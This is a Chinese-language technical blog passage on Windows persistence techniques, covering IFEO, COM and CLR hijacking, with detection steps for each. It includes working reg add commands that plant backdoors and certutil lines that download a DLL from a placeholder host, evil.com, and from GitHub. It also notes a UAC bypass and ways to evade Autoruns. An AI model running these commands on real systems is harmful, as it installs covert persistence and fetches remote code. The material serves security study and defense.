+<h4 id="Startup-Keys"><a href="#Startup-Keys" class="headerlink" title="Startup Keys"></a>Startup Keys</h4><p>开始菜单启动项，指示启动文件夹的位置，User Shell Folders优先于Shell Folders。</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\E</span>xplorer<span class="symbol">\U</span>ser Shell Folders</div><div class="line">HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\E</span>xplorer<span class="symbol">\S</span>hell Folders</div><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\E</span>xplorer<span class="symbol">\S</span>hell Folders</div><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\E</span>xplorer<span class="symbol">\U</span>ser Shell Folders</div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">检查相关注册表键值</div><div class="line"><span class="built_in">Process</span> Explorer</div></pre></td></tr></table></figure>
+<h4 id="Browser-Helper-Objects"><a href="#Browser-Helper-Objects" class="headerlink" title="Browser Helper Objects"></a>Browser Helper Objects</h4><p>本质上是Internet Explorer启动时加载的DLL模块</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\E</span>xplorer<span class="symbol">\B</span>rowser Helper Objects</div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">检查注册表：HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\C</span>urrentVersion<span class="symbol">\E</span>xplorer<span class="symbol">\B</span>rowser Helper Objects</div><div class="line">Process Explorer</div></pre></td></tr></table></figure>
+<h4 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h4><p>注册表中默认存在两个注册表项：<code>AppInit_DLLs</code>和<code>LoadAppInit_DLLs</code>(win2003没有，但是可以新建)，User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，如果有值，调用LoadLibrary() api加载用户dll。PS：xp系统会忽略<code>LoadAppInit_DLLs</code>注册表项</p>
+<p>严格来讲，此dll注入不是注入到所有运行进程，而是注入到加载User32.dll的进程中</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>indows<span class="symbol">\A</span>ppInit_DLLs</div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">检查注册表：HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>indows<span class="symbol">\A</span>ppInit_DLLs</div><div class="line">查看异常dll文件</div><div class="line">通过Process Explorer查看进程加载dll</div></pre></td></tr></table></figure>
+<h4 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h4><p>文件关联就是指系统把指定扩展名的文件自动关联到相应的应用程序，例如 <code>.doc</code> 默认打开方式是 Microsoft Word，当用户双击<code>.doc</code>文件时时就会启动 Word 打开该文件。</p>
+<p>Windows的资源管理器识别文件类型是由扩展名决定的（而并不是文件头决定文件类型）。首先扩展名会对应一种文件类型，这种文件类型的不同操作再对应到不同的具体命令。</p>
+<p>比如：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.txt --&gt; txtfile --&gt; &#123; "open": "notepad.exe %1", "edit": "notepad.exe %1", ... &#125;</div><div class="line"></div><div class="line">文件扩展名与文件类型的对应关系，可以通过assoc命令查看或修改</div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> assoc .txt</span></div><div class="line">.txt=txtfile</div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> ftype txtfile</span></div><div class="line">txtfile=%SystemRoot%\system32\NOTEPAD.EXE %1</div></pre></td></tr></table></figure>
+<p>相关的注册表：</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">Classe</span></span>    //保存了当前用户的文件关联设置</div><div class="line">HKEY_LOCAL_MACHINE<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">Classe</span></span>   //保存了本机上所有用户的设置</div><div class="line">HKEY_CLASS_ROOT                      //上面两个位置下的键值合并，是为了访问方便而建立的视图</div><div class="line">HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">Microsoft</span></span><span class="tag">\<span class="name">Windows</span></span><span class="tag">\<span class="name">CurrentVersion</span></span><span class="tag">\<span class="name">Explorer</span></span><span class="tag">\<span class="name">FileExts</span></span><span class="tag">\</span></div><div class="line">                                     //保存了右键选择"打开方式"改变默认的关联程序</div><div class="line"></div><div class="line"># 用户双击文件时查找顺序:</div><div class="line"># 首先检查...<span class="tag">\<span class="name">\</span></span>FileExts<span class="tag">\<span class="name">\</span></span>，找不到时查找HKCU，最后才是HKLM。因此检查一个文件是否与某个程序关联可以按照这个顺序检查。</div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">检查注册表：HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\C</span>lasse 、HKEY_CLASS_ROOT</div><div class="line">通过Process Explorer查看进程加载文件</div></pre></td></tr></table></figure>
+<h4 id="映像劫持-IFEO"><a href="#映像劫持-IFEO" class="headerlink" title="映像劫持(IFEO)"></a>映像劫持(IFEO)</h4><p>映像劫持（Image File Execution Options）其实是Windows内设的用来调试程序的功能，但是现在却往往被病毒恶意利用。当用户双击对应的程序后，操作系统就会给外壳程序（例如”explorer.exe”）发布相应的指令，其中包含有执行程序的路径和文件名，然后由外壳程序来执行该程序。事实上在该过程中，Windows还会在注册表的上述路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的子键，就查询对应子健中包含的”dubugger”键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到”劫持”的虚假程序。</p>
+<p>简单点说就是：当你打开的是程序A，而运行的确是程序B。</p>
+<p>注册表位置：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\I</span>mage File Execution Options</div></pre></td></tr></table></figure>
+<p>比如：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1、找到注册表"HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\I</span>mage File Execution Options"目录下的iexplore.exe</div><div class="line"></div><div class="line">2、添加一个Debugger字符串值(REG_SZ)，并且赋值为calc.exe的执行路径"c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>alc.exe"</div><div class="line"></div><div class="line">3、运行iexplore.exe即可执行calc.exe</div><div class="line"></div><div class="line"># 命令行添加：</div><div class="line"># reg add "HKLM<span class="symbol">\H</span>KEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\I</span>mage File Execution Options<span class="symbol">\n</span>otepad.exe" /v debugger /t REG_SZ /d "c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>alc.exe"</div></pre></td></tr></table></figure>
+<p>但是这样设置直接是可以看到的，根据文章<a href="https://www.anquanke.com/post/id/151425" target="_blank" rel="external">隐蔽后门——Image File Execution Options新玩法</a>了解到可以修改GlobalFlag的值，达到程序A静默退出结束后，会执行程序B的效果，且在注册表看不到具体值，同时Autorun检测不到。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">首先下载GFlages.exe的安装器dbg的安装包：</div><div class="line">http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi</div><div class="line"></div><div class="line">1、点击关卡：Silent Process Exit</div><div class="line">2、image处填写需要劫持的软件，比如：notepad.exe</div><div class="line">3、Reporting Mode处勾选Enable Silent Process Exit Monitoring和Launch monitor process</div><div class="line">4、Monitor Process处填写需要执行的软件，比如：c:\windows\system32\calc.exe</div><div class="line">5、应用-&gt;确定</div><div class="line"></div><div class="line">然后打开notepad.exe退出后即可看到calc.exe，同时notepad.exe对应的注册表中GlobalFlag无任何值</div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> 命令行：</span></div><div class="line"><span class="meta">#</span><span class="bash"> reg add <span class="string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"</span> /v GlobalFlag /t REG_DWORD /d 512</span></div><div class="line"><span class="meta">#</span><span class="bash"> reg add <span class="string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"</span> /v ReportingMode /t REG_DWORD /d 1</span></div><div class="line"><span class="meta">#</span><span class="bash"> reg add <span class="string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"</span> /v MonitorProcess /t REG_SZ /d  <span class="string">"c:\windows\system32\calc.exe"</span></span></div></pre></td></tr></table></figure>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1、排查HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\I</span>mage File Execution Options以及HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>ilentProcessExit项值是否存在关联（上述例子即可在SilentProcessExit中看到c:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>alc.exe）</div><div class="line">2、分析系统日志，日志ID为3000和3001，即有可能存在后门威胁</div><div class="line">3、直接删除IFEO项或者设置管理员不可修改</div></pre></td></tr></table></figure>
+<h4 id="COM劫持"><a href="#COM劫持" class="headerlink" title="COM劫持"></a>COM劫持</h4><p>COM（组件对象模型）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。为开发人员提供一个允许开发人员控制和操纵其他应用程序的对象的接口，每个COM对象都由一个名为CLSID的唯一ID定义，大多数COM类都在操作系统中注册，并由表示注册表中的类标识符（CLSID）的GUID标识，也就是说CLSID就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过CLSID来寻找对象的。</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">COM</span>是Component Object Model （组件对象模型）的缩写</div><div class="line"><span class="keyword">COM</span>组件由DLL和EXE形式发布的可执行代码所组成</div><div class="line"><span class="keyword">COM</span>与语言，平台无关</div><div class="line"><span class="keyword">COM</span>组件对应注册表中CLSID下的注册表键值</div></pre></td></tr></table></figure>
+<p>比如:</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">按下Ctrl+R打开运行窗口，输入：</div><div class="line">::&#123;20D04FE0<span class="string">-3</span>AEA<span class="string">-1069</span>-A2D8<span class="string">-08002</span>B30309D&#125; -&gt; 我的电脑</div><div class="line">::&#123;645FF040<span class="string">-5081</span><span class="string">-101</span>B<span class="string">-9</span>F08<span class="string">-00</span>AA002F954E&#125; -&gt; 回收站</div></pre></td></tr></table></figure>
+<p>使用ProcessMonitor可以看到应用程序的寻找过程：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1、HKEY_CURRENT_USER\Software\Classes\CLSID</div><div class="line">2、HKEY_CLASSES_ROOT\CLSID</div><div class="line">3、HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</div></pre></td></tr></table></figure>
+<p>当进程寻找COM组件时，首先会寻找： <code>HKCU\Software\Classes\CLSID</code>，所以直接在CLSID下新建一个对象ID，就能够劫持某个进程或多个进程。</p>
+<p>与DLL劫持原理相近，但是COM组件的劫持目标不一定是一个进程，也可以是一个Windows API，劫持所需的文件不一定是一个DLL，它可以是一个<code>.com</code>文件、二进制PE文件、DLL文件。</p>
+<p>MSF中自带了利用COM劫持的模块：<code>exploit/windows/local/bypassuac_comhijack</code>，该模块同时直接可以绕过UAC，具体原理参考：<a href="https://payloads.online/archivers/2018-10-14/1" target="_blank" rel="external">COM Hijacking</a></p>
+<h5 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h5><p>CLR全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。无需管理员权限的后门，并能够劫持所有.Net程序。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> SET COR_ENABLE_PROFILING=1</span></div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> SET COR_PROFILER=&#123;11111111-1111-1111-1111-111111111111&#125;</span></div><div class="line"><span class="meta">#</span><span class="bash"> &#123;11111111-1111-1111-1111-111111111111&#125;表示CLSID可设置为任意数值，只要和系统常用CLSID不冲突就行</span></div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> certutil.exe -urlcache -split -f http://evil.com/msg.dll</span></div><div class="line"><span class="meta">#</span><span class="bash"> 下载dll</span></div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> certutil.exe -urlcache -split -f http://evil.com/msg.dll delete</span></div><div class="line"><span class="meta">#</span><span class="bash"> 清除下载文件的缓存</span></div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</span></div><div class="line"><span class="meta">#</span><span class="bash"> 新建子项&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</span></div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F</span></div><div class="line"><span class="meta">#</span><span class="bash"> 新建REG_SZ类型键值ThreadingModel:Apartment</span></div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> REG.EXE ADD %KEY% /VE /T REG_SZ /D <span class="string">"%CD%\msg.dll"</span> /F</span></div><div class="line"><span class="meta">#</span><span class="bash"> 修改默认路径值为msg.dll的路径</span></div><div class="line"><span class="meta">cmd&gt;</span><span class="bash"> 当前cmd下启动.net程序，比如：powershell，即可执行dll</span></div><div class="line"></div><div class="line">DLL编写参考：https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/</div></pre></td></tr></table></figure>
+<p>要使CLR能够劫持系统中全部.net程序，需要设置环境变量，可以图形化界面操作，也可以使用WMI（通过WMI修改环境变量需要系统重启或注销重新登录才能生效）。</p>
+<p><strong>x86系统</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"</div><div class="line">wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="&#123;11111111-1111-1111-1111-111111111111&#125;"</div><div class="line">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll</div><div class="line">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete</div><div class="line">SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</div><div class="line">REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F</div><div class="line">REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F</div></pre></td></tr></table></figure>
+<p><strong>x64系统</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"</div><div class="line">wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="&#123;11111111-1111-1111-1111-111111111111&#125;"</div><div class="line">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll</div><div class="line">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete</div><div class="line">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll</div><div class="line">certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete</div><div class="line">SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</div><div class="line">REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg_x64.dll" /F</div><div class="line">REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F </div><div class="line">SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</div><div class="line">REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F</div><div class="line">REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F</div></pre></td></tr></table></figure>
+<p>POC: <a href="https://github.com/3gstudent/CLR-Injection" target="_blank" rel="external">https://github.com/3gstudent/CLR-Injection</a></p>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、检查环境变量COR_ENABLE_PROFILING和COR_PROFILER</div><div class="line">2、检查注册表键值HKEY_CURRENT_USER\Software\Classes\CLSID\有无异常</div></pre></td></tr></table></figure>
+<h5 id="CAccPropServicesClass-amp-MMDeviceEnumerato"><a href="#CAccPropServicesClass-amp-MMDeviceEnumerato" class="headerlink" title="CAccPropServicesClass&amp;MMDeviceEnumerato"></a>CAccPropServicesClass&amp;MMDeviceEnumerato</h5><p>通过CLR劫持所有<code>.Net</code>程序的方法，无需管理员权限，可用作后门。但是通过WMI添加环境变量需要重启系统。 CAccPropServicesClass和MMDeviceEnumerato后门原理与之类似，但是不需要重启系统，同样也不需要管理员权限，同时可以绕过Autoruns对启动项的检测。</p>
+<p><strong>x86系统</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">1、新建文件</div><div class="line">在<span class="variable">%APPDATA%</span><span class="symbol">\M</span>icrosoft<span class="symbol">\I</span>nstaller<span class="symbol">\&#123;</span>BCDE0395-E52F-467C-8E3D-C4579291692E&#125;<span class="symbol">\路</span>径下加入后门dll文件；</div><div class="line">命名规则为：api-ms-win-downlevel-[4char-random]-l1-1-0._dl</div><div class="line">2、修改注册表</div><div class="line">注册表位置：HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\C</span>lasses<span class="symbol">\C</span>LSID\</div><div class="line">创建项&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</div><div class="line">创建子项InprocServer32</div><div class="line">Default的键值为32位dll的绝对路径：</div><div class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\A</span>dministrator<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\I</span>nstaller<span class="symbol">\&#123;</span>BCDE0395-E52F-467C-8E3D-C4579291692E&#125;<span class="symbol">\a</span>pi-ms-win-downlevel-1x86-l1-1-0._dl</div><div class="line">创建键值：ThreadingModel | REG_SZ | Apartment</div><div class="line">3、当打开ie或者其他程序时，就会执行加载的dll</div></pre></td></tr></table></figure>
+<p><strong>x64系统</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">1、新建文件</div><div class="line">在<span class="variable">%APPDATA%</span><span class="symbol">\M</span>icrosoft<span class="symbol">\I</span>nstaller<span class="symbol">\&#123;</span>BCDE0395-E52F-467C-8E3D-C4579291692E&#125;<span class="symbol">\路</span>径下加入后门dll文件；</div><div class="line">命名规则为：api-ms-win-downlevel-[4char-random]-l1-1-0._dl</div><div class="line">2、修改注册表1</div><div class="line">注册表位置：HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\C</span>lasses<span class="symbol">\C</span>LSID\</div><div class="line">创建项&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</div><div class="line">创建子项InprocServer32</div><div class="line">Default的键值为64位dll路径：</div><div class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\A</span>dministrator<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\I</span>nstaller<span class="symbol">\&#123;</span>BCDE0395-E52F-467C-8E3D-C4579291692E&#125;<span class="symbol">\a</span>pi-ms-win-downlevel-1x64-l1-1-0._dl</div><div class="line">创建键值：ThreadingModel | REG_SZ | Apartment</div><div class="line">3、修改注册表2</div><div class="line">注册表位置：HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\C</span>lasses<span class="symbol">\W</span>ow6432Node<span class="symbol">\C</span>LSID\</div><div class="line">创建项&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</div><div class="line">创建子项InprocServer32</div><div class="line">Default的键值为32位dll路径：</div><div class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\A</span>dministrator<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>icrosoft<span class="symbol">\I</span>nstaller&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;<span class="symbol">\a</span>pi-ms-win-downlevel-1x86-l1-1-0._dl</div><div class="line">创建键值：ThreadingModel | REG_SZ | Apartment</div><div class="line">4、当打开ie或者其他程序时，就会执行加载的dll</div></pre></td></tr></table></figure>
+<p>POC：<a href="https://github.com/3gstudent/COM-Object-hijacking" target="_blank" rel="external">https://github.com/3gstudent/COM-Object-hijacking</a></p>
+<p><strong>检测及查杀</strong></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>、注册表键值</div><div class="line">HKEY_CURRENT_USER\Software\Classes\CLSID&#123;b5f8350b<span class="number">-0548</span><span class="number">-48</span>b1-a6ee<span class="number">-88</span>bd00b4a5e7&#125;\</div><div class="line">HKEY_CURRENT_USER\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F<span class="number">-467</span>C<span class="number">-8E3</span>D-C4579291692E &#125;</div><div class="line"><span class="number">2</span>、文件路径</div><div class="line">%APPDATA%\Roaming\Microsoft\Installer\&#123;BCDE0395-E52F<span class="number">-467</span>C<span class="number">-8E3</span>D-C4579291692E&#125;\</div><div class="line">命名方式：api-ms-win-downlevel-[<span class="number">4</span>char-random]-l1<span class="number">-1</span><span class="number">-0.</span>_dl</div></pre></td></tr></table></figure>
+<h5 id="MruPidlList"><a href="#MruPidlList" class="headerlink" title="MruPidlList"></a>MruPidlList</h5><p>不同于上面两种COM劫持后门，前两种是被动触发的后门，MruPidlList是主动触发的后门</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">注册表位置：HKEY_CURRENT_USER<span class="tag">\<span class="name">Software</span></span><span class="tag">\<span class="name">Classes</span></span><span class="tag">\<span class="name">CLSID</span></span><span class="tag">\</span></div><div class="line">创建项&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;</div><div class="line">创建子项InprocServer32</div><div class="line">Default的键值为dll的绝对路径：C:<span class="tag">\<span class="name">test</span></span><span class="tag">\<span class="name">calc</span></span>.dll</div><div class="line">创建键值： ThreadingModel | REG_SZ | Apartment</div></pre></td></tr></table></figure>
+<p>因为注册表对应COM对象MruPidlList，作用于shell32.dll，shell32.dll用于打开网页和文件，所以当系统启动时必定会执行，于是后门也就会主动启动，相当于一个主动后门。</p>
+<p>直观的理解：系统在启动时默认启动进程explorer.exe，explorer.exe会调用shell32.dll，加载COM对象MruPidlList</p>
+<p>此类型的后门多次被恶意软件使用：comRAT，ZeroAccess rootkit，bbsrat</p>
+<p><strong>检测和查杀</strong></p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">查看、记录、监控注册表HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\C</span>lasses<span class="symbol">\C</span>LSID<span class="symbol">\的</span>写入和修改操作</div></pre></td></tr></table></figure>
+<h3 id="系统软件"><a href="#系统软件" class="headerlink" title="系统软件"></a>系统软件</h3><h4 id="wmi"><a href="#wmi" class="headerlink" title="wmi"></a>wmi</h4><p>WMI（Windows Management Instrumentation）即 Windows 管理规范，由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统。</p>
+<blockquote>
+<p>WMI相关知识参考翻译：</p>
+<ul>
+<li>WMI 的攻击，防御与取证分析技术之攻击篇</li>
+<li>WMI 的攻击，防御与取证分析技术之防御篇</li>
+<li>WMI 的攻击，防御与取证分析技术之取证分析篇</li>
+</ul>
